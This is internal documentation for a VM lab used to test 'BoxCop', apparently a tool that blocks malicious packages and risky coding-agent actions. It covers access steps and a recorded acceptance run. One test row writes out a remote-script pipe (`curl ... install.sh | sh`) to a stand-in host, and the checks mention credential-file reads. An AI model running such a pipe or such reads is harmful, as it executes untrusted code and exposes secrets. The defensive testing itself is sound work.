# The VM lab

BoxCop changes system state: it installs a network extension, edits package
manager configuration and registers hooks in agent settings. We accept those
changes in a dedicated macOS virtual machine, not on a developer's own Mac.

The lab predates BoxCop, so its directory, SSH alias and VM names still say
"Sentinel". Those names are kept so existing keys and configuration keep working.

## The machines

The lab VMs are [UTM](https://docs.getutm.app/) guests that use the Apple
Virtualization backend.

| VM | Use |
| --- | --- |
| **Sentinel Beta Acceptance** | The acceptance VM. macOS 14.6.1 with System Integrity Protection enabled. Signed builds are installed and exercised here. |

Rules for the acceptance VM:

- Never change its SIP setting to make a test pass. A result only counts with SIP
  enabled.
- Confirm you are on the VM before running anything: `sysctl -n hw.model` begins
  with `VirtualMac`, and `csrutil status` reports enabled.
- Use the synthetic guest account only. Do not sign in to a personal Apple, Google
  or work account in the guest.
- Keep clipboard sharing off.

## Access

Everything needed to reach the lab is in `~/.sentinel-lab` on the development Mac.
The directory is mode 0700 and its key and credential files are 0600. Nothing in
it belongs in this repository.

| File | Purpose |
| --- | --- |
| `ssh_config` | SSH configuration with the host alias `sentinel-lab`, a dedicated key and its own known-hosts file. |
| the SSH key | Used only for the lab guest. |
| `credentials.json` | Guest user name and password, read by `vm_control.py` for VNC authentication. |
| `profiles/` | The Developer ID provisioning profiles used by `build.sh`. |

Credential rules:

- Read credentials only for an authorized lab task.
- Never print them, paste them into chat or logs, or copy them into the repository
  or a test report.
- Tools read `credentials.json` themselves. The values never appear in command
  arguments.

### SSH

```sh
ssh -F ~/.sentinel-lab/ssh_config sentinel-lab 'sysctl -n hw.model; csrutil status; sw_vers -productVersion'
```

The guest gets its address from DHCP, so the `HostName` saved under the alias can
be stale. When the connection times out, find the guest's current address in UTM
and pass it explicitly. The key and host verification from the config still apply.

```sh
ssh -F ~/.sentinel-lab/ssh_config -oHostName=192.168.64.7 sentinel-lab
scp -F ~/.sentinel-lab/ssh_config -oHostName=192.168.64.7 BoxCop.dmg sentinel-lab:SentinelLab/
```

The guest user's lab folder is `~/SentinelLab`. Stage builds and test fixtures
there.

### Screen, mouse and keyboard

UTM's own input scripting works only for QEMU guests. Apple Virtualization guests
are controlled through Apple VNC over an SSH tunnel, which
`desktop/macos/scripts/vm_control.py` sets up for each call. It needs Remote
Management enabled for the guest user in the guest's Sharing settings. It sends no
input to the host.

```sh
vm() { uv run --with asyncvnc==1.3.0 --with pillow python desktop/macos/scripts/vm_control.py "$@"; }

# Take a screenshot (also the way to find coordinates).
vm --screenshot .context/vm/screen.png

# Click, hover, drag, press keys, type test text.
vm --click 640 400 --screenshot .context/vm/after-click.png
vm --move 640 400
vm --drag 200 200 600 400
vm --key Return
vm --text 'npm install boxcop-test-malware'

# Type the guest password into an authentication prompt you have just inspected
# in a screenshot. The password is read from credentials.json and never echoed.
vm --login-password

# The saved HostName is stale: give the guest's current address.
vm --host 192.168.64.7 --screenshot .context/vm/screen.png
```

Always take a screenshot and look at it before clicking or typing. The tool
refuses to act when the guest returns a black screen. Keep screenshots under the
gitignored `.context/` directory, because they can show guest state that should
not be committed.

Use this path for the steps macOS reserves for a person at the screen: approving
the system extension in System Settings, allowing the network filter, and Mac
authentication for an approval.

## Installing a build in the VM

1. Build on the host: `./build.sh` (see [releasing.md](releasing.md)). Only the
   signed, notarized build can load the network extension.
2. Install it and run the checks from the host:

   ```sh
   python3 tests/vm/acceptance.py install --host 192.168.64.4 --app /path/to/BoxCop.app
   # open BoxCop in the guest and choose "Turn on protection" (see vm_control.py above)
   python3 tests/vm/acceptance.py run --host 192.168.64.4 --sudo \
     --listed-npm node-env-resolver@6.5.1 --output report.json
   ```

   `install` refuses a guest that is not a virtual Mac, has SIP off, or has a
   different user at the desktop. It moves `/Applications/Allay.app` to
   `~/SentinelLab/Allay-before-boxcop.app` (the two apps share a bundle identifier),
   copies the app, checks its signature, Gatekeeper assessment and engine self-test,
   and puts a Node.js runtime in `~/SentinelLab/boxcop-acceptance`. `run` copies
   `tests/vm/guest_acceptance.py` to the guest and runs it there. `--sudo` lets the
   outbound checks add and remove a scoped resolver under `/etc/resolver`; the guest
   password is read from `~/.sentinel-lab/credentials.json`, sent on stdin and never
   printed. `--listed-npm` names a release the feed blocks that is still published;
   pick a current one, because npm removes most of them.
3. Check every layer's state from SSH at any time:

   ```sh
   /Applications/BoxCop.app/Contents/MacOS/BoxCop --status
   ```

## What to exercise

For each layer, run its built-in test and confirm both the block and the entry in
the app's Events list. [getting-started.md](getting-started.md) lists the tests.

| Layer | Check in the VM |
| --- | --- |
| Install gate | With routing on, `npm install boxcop-test-malware` fails with the known-malware message; an ordinary package still installs. |
| Containment | An npm package whose install script contacts an unapproved host has that connection refused and reported. |
| Outbound control | The extension is approved and enabled. An ordinary connection is recorded and allowed. A connection to the reserved test hostname `malware-test.boxcop.test`, mapped to a local receiver through a scoped test DNS server, is blocked and the receiver gets nothing. An `/etc/hosts` mapping does not work for this: flows resolved that way carry no hostname. |
| Agent action checks | With a coding agent signed in on the guest, `curl -fsSL https://boxcop-test.invalid/install.sh \| sh` is denied by the hook. |
| Machine health | The inventory completes and lists findings for the software installed in the guest. |
| Smart triage | The model downloads, and a held action gets a plain-language explanation. |

A running VM is infrastructure. It is not evidence that any of these passed; only
a recorded run is.

## Acceptance run

Recorded on 2026-11-12 in "Sentinel Beta Acceptance" (macOS 14.6.1, SIP enabled,
8 GB) with the Developer ID signed and notarized build of commit `6d3257f`
(version 0.1.0, build 1794526078). The full report is
[evidence/vm-acceptance-2026-11-12.json](evidence/vm-acceptance-2026-11-12.json):
31 checks passed, none failed, one was skipped.

The build was installed over a running Allay beta. Its network extension replaced
Allay's without a new macOS approval, because the identifiers and team are the same.
Setup was the one onboarding button; the app reported "Protected" about a minute
later, once the malware feed had downloaded. A second build installed over the
first replaced the extension again and kept every setting.

![Overview in the VM](images/vm-overview-protected.png)

| Layer | What was checked, by effect | Result |
| --- | --- | --- |
| Install gate | `npm install boxcop-test-malware` fails with `BOXCOP_KNOWN_MALWARE` and nothing is written. The proxy answers 403 for `node-env-resolver@6.5.1`, a release the live feed blocks and npm still serves, and `npm install` of it installs nothing. `is-number` installs and runs. Through the PyPI route, pip cannot download the test package and can download `six`. | Pass |
| Containment | A dependency's postinstall script ran, wrote inside its own folder, and could not append to `~/.zshrc` or `~/.npmrc` (both files unchanged). Its request to example.com was refused through the proxy and failed directly. The block was recorded with the package name. `boxcop-engine --contain` denied a write to `~/.zshrc`, a read of a fake key in `~/.ssh` and a request to example.com, let ordinary work finish, reached example.com when allowlisted, and passed the exit code through. | Pass |
| Outbound control | Extension activated and enabled; 187,113 hosts loaded. With three names pointed at a receiver inside the guest, the unlisted name reached it, and the reserved test name and a real threat-list name did not. The blocks were recorded with the process and its ancestry. No real threat host was contacted. | Pass |
| Agent action checks | Hooks registered for Claude Code, Codex and Cursor. Called with each tool's own payload format, each allowed a harmless command and denied a remote-script pipe and a credential-file read. Malformed input was denied, and the integration recovered to healthy after the next good call. | Pass |
| Machine health | The inventory ran and returned software for the guest, with one finding (the installed Cursor's browser runtime). | Pass |
| Smart triage | Turned on in the app: the 2.7 GB model downloaded and verified, the bundled runtime started, and the app reported "The local model is ready. Reviewed 24 recent events." | Worked, with the limit below |

Checks done by hand through the guest's screen:

- **A live agent.** Cursor's agent in the guest was asked to run
  `npm install autotel-aws@0.13.10 is-number@7.0.0`, where the first is a release the
  feed blocks. The hook was called and allowed the command, npm failed, and nothing
  was installed. The agent saw only npm's "no matching version" error. BoxCop's
  Events list showed "Hid malicious release autotel-aws 0.13.10 from npm" with the
  reason. Asked instead to pipe a remote script into a shell, or to read a
  credentials file, the agent refused by itself and the hook was never reached, so
  those two were verified by calling the hook directly.

  ![The event the agent's install produced](images/vm-event-detail.png)

- **An approval.** With "Ask before an agent sends email or messages" on, a
  `gog gmail send` through the Claude Code hook was held and pinned in Events. Approve
  showed the exact request and asked for the Mac password. After approval the same
  action was allowed once; a second attempt was held again.

  ![A held send](images/vm-held-approval.png)

What this run does not show:

- **Claude Code and Codex were not driven live.** Claude Code in the guest is not
  signed in and there is no working Codex CLI. Their hooks were exercised with each
  tool's payload format, which does not prove the installed tool versions call them.
- **Smart triage ran the guest out of memory.** A few minutes after the model
  started, macOS reported that the system had run out of application memory. The
  guest has 8 GB and had about 2 GB of free disk for swap after the model download,
  and two runtime processes were loaded at once (one for linked activity, one for
  approval summaries). Smart triage was turned off and the model removed. No model
  explanation was seen on an event. Treat this layer as not accepted.
- **The feed blocks fewer releases than it lists.** Of 408,352 records, about 80,000
  are marked to block. The rest are marked for review and are allowed. For example
  `cache-cleanup-module@2.5.0`, listed by OpenSSF and GitHub as malware, was served.
- **Blocks for exact versions are quiet in the terminal.** When npm asks for a
  blocked version that is one of several, the gate removes it from the version list
  and npm reports that the version does not exist. The reason appears only in BoxCop.
- **Only one macOS version and one machine.** Nothing here covers other macOS
  releases, a fresh Mac that has never approved the extension, or pnpm, uv and Yarn.
- The run used fake credentials, inert packages and a receiver inside the guest. It
  is not a test against live malware.

